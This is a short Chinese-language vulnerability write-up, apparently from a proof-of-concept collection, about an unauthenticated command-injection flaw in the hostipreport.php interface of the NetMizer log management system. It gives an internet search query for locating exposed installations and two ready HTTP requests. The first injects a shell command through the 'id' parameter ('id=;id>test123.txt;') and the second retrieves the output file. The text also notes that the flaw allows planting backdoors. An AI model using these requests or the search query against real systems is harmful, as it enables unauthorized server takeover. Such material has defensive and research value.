# NetMizer日志管理系统hostipreport接口存在RCE漏洞

### 一、漏洞描述
NetMizer 日志管理系统hostipreport接口处存在命令执行漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。

### 二、资产测绘
```plain
title="NetMizer 日志管理系统"
```

### 四、漏洞复现
```plain
GET /data/yxproject/hostipreport.php?action=showtask&id=;id>test123.txt; HTTP/1.1
Host: 
User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

访问路径获取文件
```plain
GET /data/yxproject/test123.txt HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Connection: close
Cache-Control: no-cache
Pragma: no-cache
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip
```
